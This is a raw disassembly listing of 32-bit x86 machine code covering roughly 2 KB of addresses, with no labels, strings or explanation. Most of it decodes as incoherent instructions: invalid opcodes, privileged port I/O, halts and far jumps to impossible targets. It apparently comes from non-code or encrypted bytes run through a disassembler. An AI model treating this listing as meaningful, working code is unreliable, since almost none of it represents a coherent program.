  403102:	adc    DWORD PTR [ebp+0x79],ecx
  403105:	fs aad 0xc8
  403108:	push   esp
  403109:	out    dx,eax
  40310a:	sub    bh,BYTE PTR [esp+edx*4-0x1d4a63c1]
  403111:	stos   BYTE PTR es:[edi],al
  403112:	mov    edi,0xb3b347a7
  403117:	fiadd  WORD PTR [ebp-0x1c]
  40311a:	outs   dx,DWORD PTR ds:[esi]
  40311b:	xlat   BYTE PTR ds:[ebx]
  40311c:	out    dx,eax
  40311d:	mov    esi,DWORD PTR [ebx-0x4c41fd38]
  403123:	add    DWORD PTR [eax+0x27],ebp
  403126:	outs   dx,DWORD PTR ds:[esi]
  403127:	retf   
  403128:	push   ecx
  403129:	mov    bl,0xd
  40312b:	xchg   ch,dl
  40312d:	out    dx,eax
  40312e:	lahf   
  40312f:	getsec 
  403131:	add    al,0xb2
  403133:	out    0xd3,al
  403135:	push   cs
  403136:	pop    es
  403137:	outs   dx,DWORD PTR ds:[esi]
  403138:	in     al,0x15
  40313a:	or     eax,0x6114fd36
  40313f:	push   ecx
  403140:	not    DWORD PTR [esi]
  403142:	div    BYTE PTR [edx]
  403144:	add    bh,BYTE PTR ds:0xeb380c06
  40314a:	mov    eax,0xbd360ce3
  40314f:	jp     0x4030d5
  403151:	jbe    0x4030f1
  403153:	mov    cl,0x96
  403155:	or     DWORD PTR [ebp-0x9b9353],0x13b44d5b
  40315f:	daa    
  403160:	in     eax,dx
  403161:	sub    eax,DWORD PTR [ebx+edx*4+0x32]
  403165:	and    DWORD PTR [ebp+0xf1bf25a],0xb923c86a
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x41c0687
  403185:	ja     0x4031c5
  403187:	adc    eax,0x7d977070
  40318c:	jo     0x4031fe
  40318e:	mov    esp,0xe863b827
  403193:	aam    0x2c
  403195:	pop    ebp
  403196:	adc    DWORD PTR ss:[ebp-0x4289f2ad],ebp
  40319d:	and    al,0x1d
  40319f:	or     eax,esi
  4031a1:	daa    
  4031a2:	ja     0x4031d2
  4031a4:	outs   dx,BYTE PTR ds:[esi]
  4031a5:	das    
  4031a6:	cmp    al,0xa6
  4031a8:	or     eax,0x4f0b9ad
  4031ad:	pop    ebx
  4031ae:	rcl    ebx,0x5
  4031b1:	(bad)  
  4031b2:	ja     0x40313f
  4031b4:	xchg   BYTE PTR [edi-0x7a419d17],dl
  4031ba:	nop
  4031bb:	jp     0x403212
  4031bd:	jbe    0x403160
  4031bf:	es pusha 
  4031c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c2:	mov    dl,0x1e
  4031c4:	xlat   BYTE PTR ds:[ebx]
  4031c5:	sbb    eax,0x36196e33
  4031ca:	sbb    al,0x45
  4031cc:	lea    ebx,[ebx]
  4031ce:	jmp    0x403203
  4031d0:	fcomp  DWORD PTR [edx]
  4031d2:	jecxz  0x4031d7
  4031d4:	xor    al,0xe5
  4031d6:	sub    dl,al
  4031d8:	sbb    ebp,DWORD PTR [ebx-0x64316609]
  4031de:	sbb    al,0x11
  4031e0:	inc    DWORD PTR [esi+0x7]
  4031e3:	shl    BYTE PTR [edi],0xe3
  4031e6:	fldcw  WORD PTR [edx]
  4031e8:	(bad)  
  4031e9:	(bad)  
  4031ea:	aad    0xbf
  4031ec:	int    0xa0
  4031ee:	hlt    
  4031ef:	retf   0x5cbe
  4031f2:	cmp    ch,BYTE PTR [edi+ebx*2]
  4031f5:	enter  0x9f81,0xa6
  4031f9:	out    0xcd,eax
  4031fb:	xor    BYTE PTR [esi+0x35],ah
  4031fe:	and    eax,0xad21d005
  403203:	xlat   BYTE PTR ds:[ebx]
  403204:	xchg   ecx,eax
  403205:	nop
  403206:	loopne 0x403211
  403208:	ret    0xa4d8
  40320b:	test   al,0x41
  40320d:	adc    DWORD PTR [ebp+0x4327754f],ebx
  403213:	xor    al,0xf3
  403215:	cmp    esi,esp
  403217:	fdivrp st(4),st
  403219:	xchg   edx,eax
  40321a:	sbb    eax,0x52a30dfa
  40321f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403220:	mov    DWORD PTR [edi+0x6f],edi
  403223:	fdiv   DWORD PTR [eax]
  403225:	rol    DWORD PTR ds:0xac9b5a5c,0x5d
  40322c:	pop    edx
  40322d:	xchg   esi,eax
  40322e:	add    al,0xce
  403230:	je     0x403274
  403232:	jecxz  0x4031d3
  403234:	aas    
  403235:	inc    esp
  403236:	cld    
  403237:	int3   
  403238:	mov    eax,?
  40323a:	sar    esi,1
  40323c:	mov    ch,0x88
  40323e:	jmp    0x4739c6d6
  403243:	sahf   
  403244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403245:	cmp    eax,ecx
  403247:	es xchg esi,eax
  403249:	xchg   edi,eax
  40324a:	outs   dx,DWORD PTR ds:[esi]
  40324b:	cdq    
  40324c:	js     0x4031ef
  40324e:	adc    DWORD PTR [eax],0x15cbdff5
  403254:	or     DWORD PTR [eax+0x42f5ef3c],edx
  40325a:	jmp    DWORD PTR [ecx-0x15c9b7f1]
  403260:	je     0x40321c
  403262:	ins    BYTE PTR es:[edi],dx
  403263:	inc    ecx
  403264:	jge    0x40321b
  403266:	sub    al,0x35
  403268:	or     al,ch
  40326a:	sub    bh,cl
  40326c:	(bad)  
  40326d:	dec    esp
  40326e:	add    edx,DWORD PTR [esi]
  403270:	push   esp
  403271:	pop    es
  403272:	and    esp,DWORD PTR [edi-0x7f85a8d1]
  403278:	stos   BYTE PTR es:[edi],al
  403279:	pop    ebx
  40327a:	push   es
  40327b:	test   al,0xbc
  40327d:	das    
  40327e:	sbb    eax,0xdd960190
  403283:	out    dx,eax
  403284:	retf   
  403285:	sub    dh,0x5c
  403288:	cmp    al,0x87
  40328a:	aad    0xe
  40328c:	cld    
  40328d:	xchg   esp,eax
  40328e:	jnp    0x4032f2
  403290:	sub    eax,0xb1c070bb
  403295:	mov    ebx,0xea09b44d
  40329a:	jnp    0x40322b
  40329c:	dec    edi
  40329d:	xor    DWORD PTR [edx+0x1caf2d07],edi
  4032a3:	das    
  4032a4:	push   ebp
  4032a5:	jo     0x403251
  4032a7:	hlt    
  4032a8:	add    al,ch
  4032aa:	call   0x553ada26
  4032af:	mov    bh,0x50
  4032b1:	scas   al,BYTE PTR es:[edi]
  4032b2:	cwde   
  4032b3:	imul   esp,DWORD PTR [eax],0x3306073c
  4032b9:	mov    esi,0x727eac43
  4032be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032bf:	pop    esi
  4032c0:	mov    edi,0x25791f83
  4032c5:	adc    al,dl
  4032c7:	shl    BYTE PTR [ebx+0x35],1
  4032ca:	ret    0xc9ba
  4032cd:	cmp    al,0xb3
  4032cf:	scas   al,BYTE PTR es:[edi]
  4032d0:	push   es
  4032d1:	mov    edi,0xf6cee0d6
  4032d6:	aam    0xa2
  4032d8:	js     0x4032bf
  4032da:	cmc    
  4032db:	sbb    eax,ecx
  4032dd:	xor    bh,ah
  4032df:	stos   BYTE PTR es:[edi],al
  4032e0:	into   
  4032e1:	inc    ebx
  4032e2:	dec    esi
  4032e3:	sar    DWORD PTR [ebp+0x70],cl
  4032e6:	sub    eax,DWORD PTR [eax+0x3d]
  4032e9:	ins    BYTE PTR es:[edi],dx
  4032ea:	sbb    esp,edi
  4032ec:	loope  0x4032da
  4032ee:	jne    0x403349
  4032f0:	push   edx
  4032f1:	jae    0x403299
  4032f3:	jno    0x4032c3
  4032f5:	inc    edi
  4032f6:	stos   BYTE PTR es:[edi],al
  4032f7:	pop    edi
  4032f8:	aaa    
  4032f9:	jmp    0xf52b:0xb4643eb7
  403300:	test   BYTE PTR [edi],cl
  403302:	adc    eax,0x3e079783
  403307:	or     DWORD PTR [ebp+eiz*8+0x6b],edi
  40330b:	lods   al,BYTE PTR ds:[esi]
  40330c:	fstp   DWORD PTR [esi+edi*8]
  40330f:	pop    esi
  403310:	add    BYTE PTR [ecx+0x627d7252],bl
  403316:	add    DWORD PTR [edi+ebx*8-0x589d3e4f],esi
  40331d:	ret    0x6cd7
  403320:	pop    edi
  403321:	push   cs
  403322:	cmp    edi,ebx
  403324:	adc    DWORD PTR [edi+0x77ca25f1],edi
  40332a:	inc    edi
  40332b:	pop    es
  40332c:	adc    eax,0x7385a881
  403331:	pop    ds
  403332:	(bad)  
  403333:	ds leave 
  403335:	sub    DWORD PTR [esp+edx*2-0x496b32d4],edi
  40333c:	jmp    FWORD PTR [ecx+eax*4]
  40333f:	hlt    
  403340:	pusha  
  403341:	jne    0x40332a
  403343:	jnp    0x40334c
  403345:	inc    ebp
  403346:	inc    eax
  403347:	stc    
  403348:	or     cl,cl
  40334a:	iret   
  40334b:	jno    0x4032d9
  40334d:	and    DWORD PTR [ebx],ebp
  40334f:	cli    
  403350:	mov    eax,ds:0x5c5c935
  403355:	mov    ch,0xa3
  403357:	mov    BYTE PTR [ebp+0xd221d55],0x44
  40335e:	ror    DWORD PTR ds:0x333f8c4,cl
  403364:	hlt    
  403365:	shr    esp,cl
  403367:	mov    eax,ds:0x5f512da7
  40336c:	mov    dh,0x19
  40336e:	fbld   TBYTE PTR [edx]
  403370:	into   
  403371:	adc    eax,0xf85029df
  403376:	mov    esi,0x31829379
  40337b:	or     ecx,esi
  40337d:	push   es
  40337e:	xor    bh,bl
  403380:	rol    ebx,1
  403382:	pop    es
  403383:	sub    eax,0xdcf13e7b
  403388:	cmp    eax,0xe0c573e
  40338d:	and    al,0xb2
  40338f:	rcr    DWORD PTR [eax+edi*2-0x74],0x4
  403394:	pushf  
  403395:	mov    al,dh
  403397:	jae    0x4033b7
  403399:	adc    eax,0x70056843
  40339e:	fs retf 
  4033a0:	retf   0x501
  4033a3:	fild   QWORD PTR [ecx+0x2086ce4]
  4033a9:	test   al,0xf8
  4033ab:	iret   
  4033ac:	or     al,0x61
  4033ae:	mov    BYTE PTR [esi+0x326d582],bh
  4033b4:	shl    eax,0x7c
  4033b7:	data16 (bad) 
  4033b9:	mov    al,0x67
  4033bb:	stc    
  4033bc:	push   eax
  4033bd:	xlat   BYTE PTR ds:[ebx]
  4033be:	or     al,0xd4
  4033c0:	enter  0xd1a3,0x52
  4033c4:	sub    DWORD PTR [ecx+0x3f],eax
  4033c7:	jg     0x40342f
  4033c9:	jb     0x4033c6
  4033cb:	scas   eax,DWORD PTR es:[di]
  4033cd:	jb     0x403413
  4033cf:	push   ss
  4033d0:	adc    ah,BYTE PTR [edi+0x1c]
  4033d3:	icebp  
  4033d4:	test   BYTE PTR [ecx+0x35f4e074],bl
  4033da:	hlt    
  4033db:	mov    al,0x8b
  4033dd:	push   es
  4033de:	lods   eax,DWORD PTR ds:[esi]
  4033df:	pop    ecx
  4033e0:	int    0x49
  4033e2:	jmp    0x4033c7
  4033e4:	xchg   ebx,eax
  4033e5:	lock pop esi
  4033e7:	out    dx,eax
  4033e8:	pop    esp
  4033e9:	sbb    al,0x5c
  4033eb:	aad    0xb7
  4033ed:	(bad)  
  4033ee:	aad    0x14
  4033f0:	idiv   BYTE PTR [ebp-0x642139ff]
  4033f6:	inc    ebp
  4033f7:	cmp    dh,BYTE PTR [ebx-0x2cced243]
  4033fd:	mov    esp,0x9e6be63
  403402:	dec    edi
  403403:	ja     0x4033bd
  403405:	cs push ebp
  403407:	or     BYTE PTR [edx+0x7c],al
  40340a:	push   cs
  40340b:	lods   eax,DWORD PTR ds:[esi]
  40340c:	mov    ds:0x402a4458,al
  403411:	(bad)  
  403412:	in     eax,dx
  403413:	imul   esp,DWORD PTR [edi-0x2b],0xa0245192
  40341a:	adc    al,0x23
  40341c:	sub    eax,0xe35093c8
  403421:	mov    ah,0xb5
  403423:	(bad)  
  403424:	out    0xaf,al
  403426:	pop    ebp
  403427:	rep outs dx,DWORD PTR ds:[esi]
  403429:	sti    
  40342a:	pop    es
  40342b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40342c:	imul   esp
  40342e:	mov    ebx,0xa751fc27
  403433:	das    
  403434:	inc    ebx
  403435:	mov    ebx,0x2a959ca
  40343a:	in     eax,dx
  40343b:	arpl   WORD PTR [esp+esi*8-0x4d],bp
  40343f:	cmp    al,0x3a
  403441:	inc    eax
  403442:	dec    eax
  403443:	scas   al,BYTE PTR es:[edi]
  403444:	adc    al,0x84
  403446:	xor    bh,BYTE PTR [ebp-0x32]
  403449:	mov    fs,WORD PTR [edi]
  40344b:	dec    esi
  40344c:	or     eax,0xe70eca56
  403451:	jle    0x403436
  403453:	out    dx,al
  403454:	dec    edi
  403455:	and    al,0xe
  403457:	push   ds
  403458:	push   ecx
  403459:	add    ebx,eax
  40345b:	sbb    cl,BYTE PTR [edi+0x65]
  40345e:	jecxz  0x403458
  403460:	xchg   edi,eax
  403461:	sub    esi,0xffffffca
  403464:	ja     0x4034ae
  403466:	push   ds
  403467:	and    edi,DWORD PTR [edi]
  403469:	bound  edx,QWORD PTR [eax]
  40346b:	fisttp WORD PTR [ecx]
  40346d:	push   esp
  40346e:	ficomp DWORD PTR [esi+0x6dd7a255]
  403474:	jne    0x40343a
  403476:	jns    0x403433
  403478:	sbb    al,0x68
  40347a:	jno    0x40346b
  40347c:	or     eax,0x10185c02
  403481:	mov    ds:0x4d6f5eba,al
  403486:	movq   mm3,mm6
  403489:	xchg   bh,bl
  40348b:	inc    ebp
  40348c:	xor    bh,BYTE PTR [ebp-0x75]
  40348f:	cwde   
  403490:	xor    al,0x4
  403492:	or     DWORD PTR [edx],ecx
  403494:	pop    eax
  403495:	pusha  
  403496:	popf   
  403497:	ins    DWORD PTR es:[edi],dx
  403498:	mov    ch,0xfb
  40349a:	mov    DWORD PTR [edx-0x6ebee5e6],edi
  4034a0:	sbb    dl,BYTE PTR [ebx+ebp*8]
  4034a3:	push   ebx
  4034a4:	aaa    
  4034a5:	adc    BYTE PTR [edi+0x6dd85d71],ch
  4034ab:	and    al,BYTE PTR [ebx]
  4034ad:	mov    bh,0x71
  4034af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b0:	mov    ch,0xaf
  4034b2:	iret   
  4034b3:	dec    esp
  4034b4:	mov    al,BYTE PTR [esi]
  4034b6:	shl    DWORD PTR [edi-0x39],cl
  4034b9:	in     al,dx
  4034ba:	and    ah,dl
  4034bc:	mov    DWORD PTR ds:0x1f80191d,esi
  4034c2:	mov    edx,0xb62c139
  4034c7:	es jg  0x4034ff
  4034ca:	pop    ebx
  4034cb:	lods   eax,DWORD PTR ds:[esi]
  4034cc:	test   al,0x34
  4034ce:	sub    bh,ch
  4034d0:	iret   
  4034d1:	imul   ebx,DWORD PTR [edi],0xffffffa7
  4034d4:	and    eax,0xe94fa897
  4034d9:	fcmovu st,st(1)
  4034db:	xor    eax,0x62d226e3
  4034e0:	les    eax,FWORD PTR [edx]
  4034e2:	stc    
  4034e3:	retf   0x772f
  4034e6:	sbb    BYTE PTR [esi],0xd6
  4034e9:	out    dx,al
  4034ea:	xchg   esi,eax
  4034eb:	or     BYTE PTR [edx-0x16],cl
  4034ee:	arpl   WORD PTR [edi-0x79],ax
  4034f1:	or     eax,0x5c5fcd02
  4034f6:	out    dx,eax
  4034f7:	test   DWORD PTR [ebp-0x701bf21e],ebp
  4034fd:	xchg   BYTE PTR ds:0x4a98fa5,ah
  403503:	std    
  403504:	mov    ah,0x1
  403506:	sub    esi,DWORD PTR [bp+di-0x4843]
  40350b:	rol    BYTE PTR [eax-0x3932d070],0xe
  403512:	in     al,0xb2
  403514:	xchg   esi,eax
  403515:	ror    BYTE PTR [edi+0x70a5ed60],1
  40351b:	daa    
  40351c:	in     al,dx
  40351d:	out    0xc9,al
  40351f:	mov    ebp,0xaedff6de
  403524:	sub    DWORD PTR [esi-0xf],ebp
  403527:	add    edi,esi
  403529:	mov    esi,DWORD PTR [ebp+0x8]
  40352c:	imul   edi,edx
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x4035a6
  403544:	inc    ecx
  403545:	mov    edx,DWORD PTR [ebx]
  403547:	push   ebp
  403548:	adc    dh,BYTE PTR [eax+0x70]
  40354b:	xchg   edi,eax
  40354c:	jge    0x4035be
  40354e:	jo     0x403573
  403550:	jmp    0x4035ab
  403552:	stos   DWORD PTR es:[edi],eax
  403553:	sub    ebp,DWORD PTR [eax+edx*2+0x59]
  403557:	mov    bl,0x8e
  403559:	add    edi,DWORD PTR [ebp-0x45]
  40355c:	mov    eax,ds:0x7ada9746
  403561:	pop    ebp
  403562:	pop    esi
  403563:	shl    BYTE PTR [eax+0x77ad1ab9],0xa7
  40356a:	jmp    0xb4fd0d86
  40356f:	(bad)  
  403570:	outs   dx,DWORD PTR ds:[esi]
  403571:	test   al,0xbe
  403573:	daa    
  403574:	xchg   ecx,eax
  403575:	xchg   ecx,eax
  403576:	lds    esp,FWORD PTR [eax]
  403578:	adc    al,0x4a
  40357a:	pop    edx
  40357b:	cmp    bl,bl
  40357d:	pop    eax
  40357e:	xor    al,0x6b
  403580:	(bad)  
  403582:	jecxz  0x40357d
  403584:	popa   
  403585:	cmc    
  403586:	push   0x46fc7619
  40358b:	(bad)  
  40358c:	pushf  
  40358d:	lea    ebx,ds:0x53f8bb60
  403593:	shr    BYTE PTR [eax+eiz*8+0x1a],0xf0
  403598:	sub    cl,0xe8
  40359b:	rol    BYTE PTR [esi],cl
  40359d:	mov    ds:0x84bdf66e,al
  4035a2:	adc    BYTE PTR fs:[ebp+0x27],bl
  4035a6:	bound  eax,QWORD PTR [ebx-0x1d]
  4035a9:	gs jle 0x4035fb
  4035ac:	mov    dh,0x3d
  4035ae:	adc    DWORD PTR [ebx-0x61d98868],0xffffffaa
  4035b5:	lahf   
  4035b6:	xor    edx,esi
  4035b8:	sub    ebx,DWORD PTR [eax*4-0x53278e03]
  4035bf:	push   esi
  4035c0:	inc    ebx
  4035c1:	jb     0x4035e4
  4035c3:	jnp    0x403545
  4035c5:	js     0x4035b5
  4035c7:	mov    ?,WORD PTR [esi+0x21552e1b]
  4035cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ce:	sbb    ebp,DWORD PTR [edx]
  4035d0:	sub    al,0xa2
  4035d2:	dec    BYTE PTR [ebp-0x35]
  4035d5:	xchg   edx,eax
  4035d6:	gs js  0x403629
  4035d9:	pop    es
  4035da:	mov    ch,0xb
  4035dc:	sti    
  4035dd:	add    DWORD PTR [esi+0x14],edi
  4035e0:	xor    DWORD PTR [ecx],0x66e9e136
  4035e6:	jns    0x4035bb
  4035e8:	mov    esi,eax
  4035ea:	push   0xfffffff3
  4035ec:	add    al,0xca
  4035ee:	neg    ebp
  4035f0:	imul   ecx,DWORD PTR [edx],0xffffffb1
  4035f3:	mov    ds:0x4d009e6f,eax
  4035f8:	pop    eax
  4035f9:	in     eax,dx
  4035fa:	cmp    al,0xa3
  4035fc:	sbb    DWORD PTR [ebx-0x59d5ca85],esi
  403602:	mov    eax,ds:0x82e4f28f
  403607:	rcl    DWORD PTR [edi],cl
  403609:	adc    eax,0x2f49cc38
  40360e:	xor    eax,0x5d78e74f
  403613:	in     eax,dx
  403614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403615:	repnz pop eax
  403617:	push   ebp
  403618:	in     al,dx
  403619:	adc    esp,DWORD PTR [ecx]
  40361b:	cmp    ecx,esi
  40361d:	ds dec edi
  40361f:	cmp    eax,0x7b6d067a
  403624:	mov    edx,0xac1c5aac
  403629:	mov    ebp,DWORD PTR [ebp+0x5272c01b]
  40362f:	adc    al,0x67
  403631:	retf   0x231
  403634:	loop   0x40361d
  403636:	mov    esp,0xb735fcef
  40363b:	leave  
  40363c:	adc    eax,0x580acbe5
  403641:	jge    0x403677
  403643:	lods   eax,DWORD PTR ds:[esi]
  403644:	adc    eax,0x6541319c
  403649:	sub    ch,BYTE PTR [esi]
  40364b:	mov    edi,0x7efd02a5
  403650:	or     al,0x31
  403652:	sbb    esp,ebp
  403654:	cmc    
  403655:	jmp    0xed84:0x8a2d4fef
  40365c:	inc    ebx
  40365d:	mov    al,BYTE PTR [edx]
  40365f:	adc    ecx,DWORD PTR [edx-0x7d]
  403662:	ja     0x40367e
  403664:	(bad)  
  403665:	call   0x4e674b5
  40366a:	mov    ds:0x79965d53,al
  40366f:	sub    eax,0x4a0d8570
  403674:	int    0xaa
  403676:	add    dl,bh
  403678:	mov    al,ds:0x1aafaf3
  40367d:	das    
  40367e:	scas   eax,DWORD PTR es:[edi]
  40367f:	add    eax,0xf1b90102
  403684:	sbb    ecx,ebp
  403686:	and    ecx,DWORD PTR ds:0xb9652156
  40368c:	xchg   ebp,eax
  40368d:	pop    bx
  40368f:	cmp    eax,0xc8437992
  403694:	mov    edi,0x85157268
  403699:	jl     0x403659
  40369b:	push   ebp
  40369c:	call   0x941aca83
  4036a1:	adc    al,0x3c
  4036a3:	lods   eax,DWORD PTR ds:[esi]
  4036a4:	adc    eax,DWORD PTR [edx]
  4036a6:	mov    WORD PTR ds:0xaf5d9a14,cs
  4036ac:	or     al,0x17
  4036ae:	mov    ebp,ecx
  4036b0:	sub    cl,dh
  4036b2:	jns    0x4036d3
  4036b4:	adc    BYTE PTR [esp+edx*4+0x23],dh
  4036b8:	or     eax,0x891fe236
  4036bd:	jg     0x403716
  4036bf:	and    eax,0xa0632d00
  4036c4:	push   0xe097beb8
  4036c9:	jmp    0xa4e7:0xcce9cf8f
  4036d0:	xor    al,0x2e
  4036d2:	and    DWORD PTR [ecx],eax
  4036d4:	pop    eax
  4036d5:	dec    eax
  4036d6:	inc    dl
  4036d8:	scas   eax,DWORD PTR es:[edi]
  4036d9:	xor    edi,DWORD PTR [edx+0x1e]
  4036dc:	les    eax,FWORD PTR [ecx+0x63b76472]
  4036e2:	repz add DWORD PTR [eax+0x74dba54e],edx
  4036e9:	outs   dx,DWORD PTR ds:[esi]
  4036ea:	retf   0xeb77
  4036ed:	call   0x15a06830
  4036f2:	mov    dh,0x47
  4036f4:	int    0xca
  4036f6:	(bad)  
  4036f7:	in     eax,dx
  4036f8:	outs   dx,BYTE PTR ds:[esi]
  4036f9:	retf   
  4036fa:	icebp  
  4036fb:	pop    eax
  4036fc:	cli    
  4036fd:	push   ecx
  4036fe:	(bad)  
  4036ff:	xor    al,0xba
  403701:	mov    ebx,0x9a598f
  403706:	inc    esp
  403707:	in     al,0x59
  403709:	push   ebx
  40370a:	mov    bl,0x6c
  40370c:	out    0x97,eax
  40370e:	imul   ebp,DWORD PTR [edi-0x3b031588],0xffffffbb
  403715:	inc    ebx
  403716:	clc    
  403717:	setbe  BYTE PTR [eax+0x53]
  40371b:	adc    DWORD PTR [esi],edi
  40371d:	pop    edx
  40371e:	cmp    dh,BYTE PTR ds:0xd8168be
  403724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403725:	mov    bl,0x2d
  403727:	fmul   DWORD PTR [ebp+0x52c1e57e]
  40372d:	jge    0x403760
  40372f:	hlt    
  403730:	jns    0x403789
  403732:	out    0xc5,eax
  403734:	inc    edx
  403735:	sub    DWORD PTR [ecx],ebp
  403737:	pop    es
  403738:	leave  
  403739:	lahf   
  40373a:	mov    cl,0xd3
  40373c:	sub    bl,BYTE PTR [eax+esi*2+0x19aea6f1]
  403743:	push   ss
  403744:	xchg   ebx,eax
  403745:	mov    ecx,0x29e2372f
  40374a:	mov    al,ds:0xac46a465
  40374f:	jno    0x4037cb
  403751:	mov    edi,0x58dfcf63
  403756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403757:	xor    DWORD PTR ds:0x17c61575,eax
  40375d:	adc    DWORD PTR [edx-0x3e],eax
  403760:	jge    0x403745
  403762:	jno    0x40373e
  403764:	lea    ebx,[edx+0x56]
  403767:	mov    edi,0x172e1112
  40376d:	inc    edx
  40376e:	add    edi,0x5d
  403771:	push   ecx
  403772:	mul    cl
  403774:	push   edx
  403775:	rol    ah,1
  403777:	popf   
  403778:	adc    ch,BYTE PTR [ecx]
  40377a:	sub    DWORD PTR [edx-0x468802e],edi
  403780:	call   0x890e7340
  403785:	or     DWORD PTR [edi+0x37],ecx
  403788:	arpl   WORD PTR [ecx],cx
  40378a:	adc    BYTE PTR [esi-0x80],ah
  40378d:	push   0x4b1d63f7
  403792:	fadd   DWORD PTR [ebx+0x2337651a]
  403798:	jl     0x403810
  40379a:	push   0x73
  40379c:	ds dec ebx
  40379e:	jno    0x4037c4
  4037a0:	pushf  
  4037a1:	nop
  4037a2:	push   edi
  4037a3:	push   eax
  4037a4:	adc    BYTE PTR [edi-0x7ae1c73b],0xa9
  4037ab:	adc    BYTE PTR [edx+0x7a],dl
  4037ae:	and    edi,DWORD PTR [ecx]
  4037b0:	sub    DWORD PTR [edi-0xb],ecx
  4037b3:	sub    DWORD PTR [ecx],edx
  4037b5:	hlt    
  4037b6:	jl     0x403792
  4037b8:	sbb    eax,0x347b17c
  4037bd:	jbe    0x40378d
  4037bf:	add    eax,0x740eab57
  4037c4:	push   eax
  4037c5:	pop    ss
  4037c6:	adc    ebp,ebx
  4037c8:	cs push ebp
  4037ca:	mov    ah,0x55
  4037cc:	pop    edx
  4037cd:	rcr    BYTE PTR [esi],cl
  4037cf:	pop    ebx
  4037d0:	out    dx,al
  4037d1:	xor    dl,cl
  4037d3:	pushf  
  4037d4:	stc    
  4037d5:	stos   BYTE PTR es:[edi],al
  4037d6:	jmp    DWORD PTR [esi]
  4037d8:	xchg   edi,eax
  4037d9:	cmc    
  4037da:	mov    ebx,0xb33d963c
  4037df:	scas   al,BYTE PTR es:[edi]
  4037e0:	pop    ebp
  4037e1:	aas    
  4037e2:	pop    edx
  4037e3:	sub    ch,BYTE PTR [ecx]
  4037e5:	cli    
  4037e6:	imul   esp,DWORD PTR [edx],0x78
  4037e9:	sub    ecx,ebp
  4037eb:	sbb    dh,BYTE PTR [ebx+0x2df98501]
  4037f1:	clc    
  4037f2:	out    dx,eax
  4037f3:	ins    BYTE PTR es:[edi],dx
  4037f4:	int3   
  4037f5:	pushf  
  4037f6:	inc    ecx
  4037f7:	fnsave [ebp+0x15]
  4037fa:	adc    eax,0x1e34e154
  4037ff:	or     al,0xb1
  403801:	mov    ah,0xda
  403803:	loop   0x40380f
  403805:	(bad)  
  403806:	fldcw  WORD PTR [edx-0x1dfd2a35]
  40380c:	jge    0x4037d9
  40380e:	popf   
  40380f:	nop
  403810:	sub    ebp,eax
  403812:	test   DWORD PTR [ecx-0x694f7e7a],ecx
  403818:	mov    ds:0xd9ee6a47,eax
  40381d:	jmp    0x403862
  40381f:	pop    edi
  403820:	ss dec eax
  403822:	pop    ebx
  403823:	lods   al,BYTE PTR ds:[esi]
  403824:	shr    BYTE PTR [esp+ebx*1+0x4d],cl
  403828:	nop
  403829:	jbe    0x403898
  40382b:	xor    eax,0xff96fc19
  403830:	pusha  
  403831:	jl     0x40381a
  403833:	pop    esi
  403834:	jmp    0xebdc:0xbc9999dc
  40383b:	outs   dx,DWORD PTR ds:[esi]
  40383c:	enter  0x1dd0,0x93
  403840:	mov    dl,0xbc
  403842:	inc    eax
  403843:	enter  0x8430,0x1b
  403847:	call   0x70c6:0xa321aaba
  40384e:	stos   DWORD PTR es:[edi],eax
  40384f:	hlt    
  403850:	jmp    0xdf82:0x181bbb59
  403857:	or     esp,DWORD PTR ds:[edx]
  40385a:	sti    
  40385b:	and    dl,BYTE PTR [edi+0x4e]
  40385e:	push   esi
  40385f:	out    dx,eax
  403860:	adc    DWORD PTR [ebp-0x42c37439],edx
  403866:	iret   
  403867:	fcmovne st,st(3)
  403869:	and    eax,0x31f8ed91
  40386e:	dec    ebx
  40386f:	cmp    cl,bl
  403871:	ins    DWORD PTR es:[edi],dx
  403872:	xor    eax,0x2762b1ad
  403877:	xchg   ecx,eax
  403878:	jns    0x4038ad
  40387a:	mov    dh,BYTE PTR [edi+0x7542d149]
  403880:	sub    edi,ebp
  403882:	gs jae 0x40386a
  403885:	adc    al,BYTE PTR [eax-0x29c25ffc]
  40388b:	pop    edi
  40388c:	pop    ebp
  40388d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40388e:	imul   esp,DWORD PTR [ecx],0xffffffb8
  403891:	sub    al,0xe5
  403893:	sbb    eax,edi
  403895:	addr16 addr16 jl 0x40383c
  403899:	out    dx,al
  40389a:	test   eax,0x674a8f70
  40389f:	push   edi
  4038a0:	shr    BYTE PTR [ebx-0xde9552a],0xb5
  4038a7:	xchg   ebp,eax
  4038a8:	jg     0x40391e
  4038aa:	sub    BYTE PTR [esi],al
  4038ac:	sub    eax,0x64c094e9
  4038b1:	and    eax,0x43e1d4d3
  4038b6:	sbb    eax,0x535de436
  4038bb:	ret    
  4038bc:	mov    ss,ebx
  4038be:	loopne 0x403887
  4038c0:	fst    DWORD PTR [ebp+0x6c2110d5]
  4038c6:	sahf   
  4038c7:	inc    esi
  4038c8:	scas   al,BYTE PTR es:[edi]
  4038c9:	jmp    0x4038ac
  4038cb:	cmc    
  4038cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038cd:	sbb    dl,ch
  4038cf:	aaa    
  4038d0:	stc    
  4038d1:	adc    DWORD PTR [eax+0x26798814],0xfbaf1dfe
  4038db:	fistp  WORD PTR [ebx]
  4038dd:	nop
  4038de:	and    al,0x4f
  4038e0:	(bad)  
  4038e1:	mov    al,ds:0x34d7124c
  4038e6:	in     al,dx
  4038e7:	shl    BYTE PTR [ebx],cl
